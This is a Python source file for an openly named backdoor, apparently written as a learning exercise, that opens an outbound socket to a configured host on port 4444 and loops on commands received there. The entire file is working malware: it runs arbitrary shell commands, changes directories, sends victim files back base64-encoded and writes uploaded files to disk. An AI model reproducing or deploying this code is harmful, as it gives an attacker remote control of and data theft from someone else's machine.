#!/usr/bin/env python
import socket
import subprocess
import json
import os
import base64

IP_ADDRESS = ''


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        # json.dumps is the method that converts data into a Json object
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            # everytime we run this loop we are going to overwrite
            # whatever is stored in json_data
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
        # json.loads = unpackaging of the data

    def execute_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)

    def change_dir_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + str(os.getcwd())

    def view_current_dir(self, path):
        return "The current directory is " + str(path)

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    def start(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == 'exit':
                    self.connection.close()
                    exit()
                elif command[0] == 'cd' and len(command) > 1:
                    # command is a list, if length (items in list) > 1, then
                    command_result = self.change_dir_to(command[1])
                elif command[0] == 'cd' and len(command) == 1:
                    # command is a list, if length (items in list) = 1, then
                    command_result = self.view_current_dir(os.getcwd())
                elif command[0] == 'download':
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == 'upload':
                    command_result = self.write_file(
                        command[1], command[2].encode())
                    # The two arguments taken by write_file() are the file name
                    # and content
                else:
                    command_result = self.execute_command(command).decode()
                    # We use .decode() because we need a string, not bytes.
                    # Bytes can't be converted into JSON, or something like that

            except Exception:
                command_result = "[-] Error during execution"
            self.reliable_send(command_result)


my_backdoor = Backdoor(IP_ADDRESS, 4444)
my_backdoor.start()
